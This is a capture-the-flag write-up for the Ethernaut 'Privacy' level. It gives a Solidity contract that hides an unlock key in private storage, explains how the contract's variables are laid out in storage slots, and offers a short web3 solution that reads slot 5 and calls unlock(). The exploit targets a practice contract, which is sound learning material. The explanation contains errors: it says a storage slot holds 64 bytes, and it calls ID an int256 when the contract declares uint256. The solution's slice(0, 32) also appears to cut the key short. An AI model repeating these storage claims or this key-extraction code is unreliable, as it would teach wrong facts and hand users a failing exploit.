# **Level 12 -- Privacy**
## **Contract to hack**
``` ts
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
`````` 
---
## ***Objectives***
* Unlock
---
## ***Thought Process***
The knowledge point is the same as the one in Level 8.
Due to the type of the parameter `ID` is `int256`, it needs to occupy a separate slot. Therefore `locked` occupy a separete slot either. Then `flattening`, `denomination`, `awkwardness` can share the same slot, because every slot has 64 bytes / 256 bits, and 8 + 8 + 16 < 256.
Besides, the fixed-length array of bytes32, each bytes32 occupy 1 whole slot.
``` ts
bool public locked = true;              // slot 0
uint256 public ID = block.timestamp;    // slot 1
uint8 private flattening = 10;          // slot 2
uint8 private denomination = 255;       // slot 2
uint16 private awkwardness = uint16(block.timestamp);  //slot 2
bytes32[3] private data;                // slot 3 - 5
```
As a result, the data of the key is in slot 5.

---
## ***Solution***
``` ts
> let data = await web3.eth.getStorageAt(instance, 5);
> let key = data.slice(0, 32); // due `require(_key == bytes16(data[2]));` we only need the first 32 bytes
> await contract.unlock(key);
```



